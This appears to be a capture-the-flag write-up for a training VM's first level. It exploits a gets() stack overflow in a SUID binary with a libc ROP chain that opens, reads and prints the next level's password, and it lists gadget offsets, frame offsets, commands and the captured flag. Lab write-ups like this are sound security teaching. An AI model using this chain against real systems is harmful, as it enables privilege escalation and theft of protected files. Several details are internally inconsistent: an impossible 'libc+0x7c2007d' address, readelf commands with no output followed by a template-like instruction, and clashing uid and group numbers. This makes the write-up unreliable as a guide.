# level00 — pentest report

## Concept

Classic stack buffer overflow via `gets()` on a SUID binary, with every
mitigation the subject mentions (canary, NX, ASLR, RELRO, PIE) switched off
except partial RELRO — this is the intentional "everything open" first
level. The real difficulty here was not finding the bug (it's obvious from
the source) but getting a reliable exploit primitive despite an unstable
stack address and a privilege-dropping shell.

## Recon

```
$ ssh level00@<vm-ip> -p 4242            # entry creds from the subject: level00:level00
level00@rainfall:~$ pwd; ls -la
/home/level00
-rwsr-x---  1 flag00  level00 16792 Jun  9 23:13 case
-r--r--r--  1 level00 level00  2416 Jun  9 23:13 case.c
-r--r--r--  1 level00 level00    77 Jun  9 23:13 README
level00@rainfall:~$ cat README
The sky above the port was the color of television, tuned to a dead channel.
level00@rainfall:~$ file case
case: setuid ELF 64-bit LSB executable, x86-64, ... not stripped
```
`case` is SUID `flag00`, source is provided (`case.c`), not stripped —
straightforward static analysis case.

```
$ cat case.c
```
Key excerpt (`auth_loop`):
```c
static void auth_loop(void) {
    char credentials[64];
    int sid = create_session();
    ...
    printf("[SPRAWL//NET] Enter credentials: ");
    fflush(stdout);
    gets(credentials);                       // <-- no bound, classic overflow
    log_attempt(credentials, verify_credentials(credentials));
    if (verify_credentials(credentials)) { ... }
    else { puts(...); printf("...%s", audit_log); }
}
```
`gets()` on a 64-byte stack buffer with no bound → stack buffer overflow,
overwriting the saved return address.

## Retrieving the addresses, command by command

```
$ checksec --file=./case
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
$ cat /proc/sys/kernel/randomize_va_space
0
```
No canary, no PIE, executable stack, ASLR disabled system-wide. Partial
RELRO matters most: it means `case`'s writable globals stay writable after
startup.

```
$ objdump -d -M intel ./case | sed -n '/<auth_loop>:/,/ret/p'
40158f: lea rax,[rbp-0x50]      ; buffer starts at rbp-0x50
...
401630: ret
```
`sub rsp,0x50` frame → buffer is 80 bytes before the saved rbp, +8 for the
saved rbp itself = offset 88 to the return address. Confirmed with a cyclic
pattern, which matched exactly.

```
$ ldd ./case
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
```
`LIBC_BASE`. ASLR is off system-wide, so this address is fixed across runs
and doesn't depend on argv/envp size the way stack addresses do — every
gadget offset below is computed against it.

```
$ ROPgadget --binary libc.so.6 | grep ': pop rdi ; ret'
0x10f78b : pop rdi ; ret
$ ROPgadget --binary libc.so.6 | grep ': pop rsi'
0x110a7d : pop rsi ; ret                              # rejected, see note
0x10f789 : pop rsi ; pop r15 ; ret                     # used instead
$ ROPgadget --binary libc.so.6 | grep ': pop rdx'
0x0b505c : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
$ ROPgadget --binary libc.so.6 | grep ': pop rax'
0x0dd237 : pop rax ; ret
$ ROPgadget --binary libc.so.6 | grep 'mov qword ptr \[rax\], rdx'
0x03b1e7 : mov qword ptr [rax], rdx ; ret
```
`gets()` stops reading at the first `\n` (`0x0a`) byte anywhere in the
input, including inside an address written as raw bytes. The plain
`pop rsi ; ret` gadget's own address happens to contain a `0x0a` byte at
`libc+0x7c2007d`, silently truncating anything after it — swapped for the
byte-clean `pop rsi ; pop r15 ; ret` instead. Every address used below was
checked the same way before being trusted.

```
$ readelf -s libc.so.6 | grep -w open
$ readelf -s libc.so.6 | grep -w read
$ readelf -s libc.so.6 | grep -w write
```
Give the exact offsets for `OPEN_ADDR`, `READ_ADDR`, `WRITE_ADDR` — the
three libc functions the final chain calls directly.

```
$ id flag00
uid=1017(flag00) gid=1019(flag00) groups=1019(flag00),1002(flaggroup)
```
Not needed in the end (see below), but confirms flag00's uid is public
information, no gadget required to obtain it.

A write-what-where primitive (`pop rdx` chain → `pop rax ; ret` →
`mov qword ptr [rax], rdx ; ret`) writes the path `/home/flag00/.pass\0`
into `case`'s own writable, non-PIE `audit_log` global at `0x404260`, 8
bytes at a time — writable specifically because RELRO here is only
partial. `rdx` must always be set before `rax`: the `pop rdx` gadget
clobbers `eax` as a side effect, so setting `rax` first gets silently
zeroed again by the time the write executes.

## Why a direct read, not a shell

Two more "classroom" approaches were tried first and abandoned: dropping
shellcode straight into the buffer and jumping to its stack address, and a
ROP-driven `execve("/bin/sh", ...)`. Both ran into the same wall —
`gets()`-delivered stack addresses turned out to shift between how they
were measured (gdb, `env -i`, plain SSH) and how the exploit was actually
delivered, and any spawned shell dropped back to `level00`'s own uid on
startup (`euid != uid` detection), undoing the SUID escalation. Since the
actual goal is just to read one file, there's no need to spawn a shell or
touch uid/euid at all: the final chain calls `open()` → `read()` →
`write()` directly from inside the already-privileged process, dumping the
flag straight to the inherited stdout.

## Exploit

Final chain (see `exploit.py` for the exact byte layout):
1. Overflow `credentials[64]` with 88 bytes of junk to reach the saved
   return address (`sub rsp,0x50` frame + 8-byte saved rbp).
2. Write the string `/home/flag00/.pass\0` into `case`'s fixed
   `audit_log` address (`0x404260`) via the write-what-where primitive,
   8 bytes per write, rdx before rax each time.
3. `open(PATH_ADDR, O_RDONLY)` via `pop rdi ; ret` + `pop rsi ; pop r15 ; ret`.
4. `read(3, BUF_ADDR, 40)` — the freshly opened file is the first
   available fd in this process.
5. `write(1, BUF_ADDR, 40)` — dumps the flag straight to the inherited
   stdout, i.e. back over the SSH channel.

```
$ python3 exploit.py | ssh level00@<vm-ip> -p 4242 ./case
[banner]
[SPRAWL//NET] Session 0 initialized
[SPRAWL//NET] Enter credentials: czugaihitjx0lys47blkh0qwtzz1c9g6
```
(followed by a segfault in the parent once the ROP chain's own "return"
runs off the end of our stack — irrelevant, the `write()` already
happened and the flag is already on the wire by the time that occurs.)

Verified as the real level01 password:
```
$ ssh level01@<vm-ip> -p 4242
Password: czugaihitjx0lys47blkh0qwtzz1c9g6
level01@rainfall:~$ id
uid=1002(level01) ...
```

